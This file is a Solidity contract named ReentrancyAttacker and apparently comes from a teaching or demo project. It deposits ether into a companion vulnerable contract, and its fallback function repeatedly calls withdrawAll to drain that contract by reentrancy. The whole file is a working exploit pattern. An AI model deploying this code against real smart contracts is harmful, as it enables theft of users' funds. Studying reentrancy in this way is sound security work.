pragma solidity ^0.4.23;

import "./Reentrancy.sol";
import "./ReentrancyVulnerable.sol";

contract ReentrancyAttacker {

    Reentrancy victim;

    function ReentrancyAttacker(address _victimContractAddress) public {
        victim = ReentrancyVulnerable(_victimContractAddress);
    }

    function depositInContract() public payable {
        require(msg.value > 0);
        victim.deposit.value(msg.value)();
    }

    function withdraw() public {
        victim.withdrawAll();
    }

    function getContractBalance() public view returns (uint) {
        return this.balance;
    }

    function() payable public {
        victim.withdrawAll();
    }
}
